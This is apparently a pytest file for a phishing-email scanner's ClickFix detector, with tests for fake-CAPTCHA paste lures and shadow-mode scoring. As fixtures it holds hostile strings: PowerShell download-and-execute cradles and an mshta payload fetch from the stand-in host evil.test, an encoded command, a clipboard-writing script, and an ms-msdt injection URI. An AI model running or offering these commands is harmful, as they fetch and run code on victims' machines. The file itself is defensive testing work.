"""ClickFix / clipboard-hijack rules and shadow integration."""

from __future__ import annotations

from unittest.mock import patch

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.engines.clickfix import ClickFixAnalyzer, ClickFixContext
from app.models import Base
from app.models.email import Email
from app.models.finding import ScanFinding
from app.models.scan import Verdict
from app.models.user import User
from app.services.scan_service import ScanService
from tests.conftest import TEST_USER_ID


def codes(result) -> set[str]:
    return {finding.code for finding in result.findings}


class TestClickFixRules:
    def test_fake_captcha_with_paste_instruction(self):
        text = (
            "Verify you are human. Press Windows + R, then paste this into "
            "PowerShell and press Enter."
        )
        result = ClickFixAnalyzer().analyze(ClickFixContext(body_text=text))
        found = codes(result)
        assert "CLICKFIX_PASTE_INSTRUCTIONS" in found
        assert "CLICKFIX_POWERSHELL_OR_LOLBIN" in found
        assert "CLICKFIX_FAKE_CAPTCHA" in found

    def test_powershell_download_cradle(self):
        text = "powershell.exe -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a')"
        result = ClickFixAnalyzer().analyze(ClickFixContext(body_text=text))
        assert "CLICKFIX_POWERSHELL_OR_LOLBIN" in codes(result)

    def test_encoded_command(self):
        text = (
            "Press Win+R and paste: powershell -EncodedCommand "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
        )
        result = ClickFixAnalyzer().analyze(ClickFixContext(body_text=text))
        assert "CLICKFIX_ENCODED_COMMAND" in codes(result)

    def test_clipboard_write_and_lure(self):
        html = (
            "<html><body><p>Press Windows + R and paste this.</p>"
            "<script>navigator.clipboard.writeText("
            "'powershell -c iwr http://evil.test/p.ps1 | iex');</script>"
            "</body></html>"
        )
        result = ClickFixAnalyzer().analyze(ClickFixContext(body_html=html))
        assert "CLICKFIX_CLIPBOARD_WRITE" in codes(result)
        assert "CLICKFIX_PASTE_INSTRUCTIONS" in codes(result)

    def test_custom_uri_handler(self):
        text = (
            "Click this verification link: ms-msdt:/id PCWDiagnostic "
            "/skip true /param IT_BrowseForFile=$(calc)"
        )
        result = ClickFixAnalyzer().analyze(ClickFixContext(body_text=text))
        assert "CLICKFIX_CUSTOM_URI" in codes(result)

    def test_lolbin_command(self):
        text = "Open Run and paste: mshta https://evil.test/payload.hta"
        result = ClickFixAnalyzer().analyze(ClickFixContext(body_text=text))
        found = codes(result)
        assert "CLICKFIX_PASTE_INSTRUCTIONS" in found
        assert "CLICKFIX_POWERSHELL_OR_LOLBIN" in found

    def test_benign_message_has_no_findings(self):
        result = ClickFixAnalyzer().analyze(
            ClickFixContext(
                subject="Team lunch",
                body_text="Lunch is at noon in the main kitchen. See you there.",
            )
        )
        assert result.findings == []


def _db(tmp_path):
    engine = create_engine(
        f"sqlite:///{tmp_path}/clickfix.db",
        connect_args={"check_same_thread": False},
    )
    Base.metadata.create_all(engine)
    db = sessionmaker(bind=engine)()
    db.add(User(id=TEST_USER_ID, google_sub="clickfix-test", email="cf@test"))
    email = Email(
        user_id=TEST_USER_ID,
        message_id="<clickfix@test>",
        sender="Helpdesk <helpdesk@corp.test>",
        subject="Action required",
        body_text=(
            "Verify you are human. Press Windows + R and paste this into "
            "PowerShell: powershell -c iwr http://evil.test/p.ps1 | iex"
        ),
        has_html=False,
        has_attachments=False,
    )
    db.add(email)
    db.commit()
    db.refresh(email)
    return engine, db, email


class TestClickFixShadowIntegration:
    @patch("app.services.scan_service.get_text_analyzer")
    @patch("app.services.scan_service.AttachmentAnalyzer")
    @patch("app.services.scan_service.UrlAnalyzer")
    def test_scan_persists_clickfix_without_changing_score(
        self, MockUrl, MockAtt, mock_text, tmp_path
    ):
        engine, db, email = _db(tmp_path)
        mock_text.return_value.analyze.return_value.confidence = 0.0
        mock_text.return_value.analyze.return_value.label = "Legitimate"
        mock_text.return_value.analyze.return_value.is_phishing = False
        mock_url = MockUrl.return_value
        mock_url.analyze.return_value.url_score = 0.0
        mock_url.analyze.return_value.total_urls = 0
        mock_url.analyze.return_value.analyzed_urls = 0
        mock_url.analyze.return_value.vt_checked_urls = 0
        mock_url.analyze.return_value.high_risk_urls = []
        mock_url.analyze.return_value.per_url_results = []
        mock_att = MockAtt.return_value
        mock_att.analyze.return_value.attachment_score = 0.0
        mock_att.analyze.return_value.total_files = 0
        mock_att.analyze.return_value.analyzed_files = 0
        mock_att.analyze.return_value.high_risk_files = []
        mock_att.analyze.return_value.per_file_results = []

        from app.engines.header_analyzer import HeaderAnalysisResult

        header = HeaderAnalysisResult(present=True, score=0.0)
        service = ScanService(db)
        with patch.object(ScanService, "_analyze_headers", return_value=header):
            scan = service.run_scan(email)

        verdict = db.query(Verdict).filter_by(scan_id=scan.id).one()
        assert verdict.final_score == 0.0
        assert verdict.classification == "safe"
        assert verdict.breakdown["clickfix"]["shadow"] is True
        assert verdict.breakdown["clickfix"]["finding_count"] >= 1
        rows = db.query(ScanFinding).filter_by(
            scan_id=scan.id, category="active_content"
        ).all()
        assert rows
        assert all(row.analyzer == "clickfix" for row in rows)
        assert all(row.evidence_json for row in rows)
        db.close()
        engine.dispose()
